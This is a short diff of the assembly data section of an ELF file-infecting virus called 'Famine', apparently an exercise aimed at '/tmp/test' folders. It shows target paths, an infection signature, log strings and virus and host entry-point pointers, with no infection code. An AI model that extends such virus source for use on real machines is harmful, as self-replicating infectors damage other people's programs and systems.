@@ -510,22 +510,14 @@ tmp_test:
     db "/tmp/test/", 0
 tmp_test2:
     db "/tmp/test2/", 0
-proc_self_maps:
-    db "/proc/self/maps", 0
-not_64_bit_msg:
-    db "Not a 64 bit ELF", 10
-not_elf_msg:
-    db "Not an ELF", 10
-file_path:
-    db "Famine", 0
 signature:
     db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
-infect_msg:
-    db "infect", 10
 virus_entrypoint:
     dq _start
 host_entrypoint:
     dq _host
+infect_msg:
+    db "infect", 10
 directory_msg:
     db "dir", 10
 host_msg:
